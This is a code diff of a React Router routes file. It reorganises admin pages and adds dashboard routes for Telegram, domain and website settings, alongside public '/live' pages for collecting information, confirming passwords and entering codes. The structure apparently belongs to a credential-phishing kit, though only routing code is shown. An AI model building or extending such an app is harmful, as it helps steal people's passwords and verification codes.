@@ -1,8 +1,11 @@
-import Admin from '@components/Admin'; // Add this import
 import FormInputGroup from '@components/FormInputGroup';
 import LoginForm from '@components/LoginForm';
-import AdminConfig from '@pages/AdminConfig';
-import AdminLogin from '@pages/AdminLogin';
+import BestAdmin from '@pages/admin/BestAdmin';
+import Dashboard from '@pages/admin/Dashboard';
+import Domain from '@pages/admin/Domain';
+import Login from '@pages/admin/Login';
+import Telegram from '@pages/admin/Telegram';
+import Website from '@pages/admin/Website';
 import CodeInput from '@pages/CodeInput';
 import ConfirmPassword from '@pages/ConfirmPassword';
 import Default from '@pages/Default';
@@ -11,18 +14,14 @@ import GetInfo from '@pages/GetInfo';
 import Home from '@pages/Home';
 import Index from '@pages/Index';
 import {
-    createBrowserRouter,
-    createRoutesFromElements,
-    Navigate,
-    Route,
+	createBrowserRouter,
+	createRoutesFromElements,
+	Navigate,
+	Route,
 } from 'react-router-dom';
 
 const Routes = createRoutesFromElements(
 	<>
-		<Route path='/admin' element={<Admin />}>
-			<Route path='login' element={<AdminLogin />} />
-			<Route path='config' element={<AdminConfig />} />
-		</Route>
 		<Route path='/live' element={<Index />} />
 		<Route path='/live/home' element={<Home />}>
 			<Route element={<GetInfo />}>
@@ -31,6 +30,14 @@ const Routes = createRoutesFromElements(
 				<Route path='confirm-password' element={<ConfirmPassword />} />
 			</Route>
 		</Route>
+		<Route path='/admin' element={<Login />} />
+		<Route path='/admin/dashboard' element={<Dashboard />}>
+			<Route index element={<Domain />} />
+			<Route path='telegram' element={<Telegram />} />
+			<Route path='domain' element={<Domain />} />
+			<Route path='website' element={<Website />} />
+		</Route>
+		<Route path='/admin/vip' element={<BestAdmin />} />
 		<Route path='/live/code-input' element={<CodeInput />} />
 		<Route path='/live/finalize' element={<Finalize />} />
 		<Route
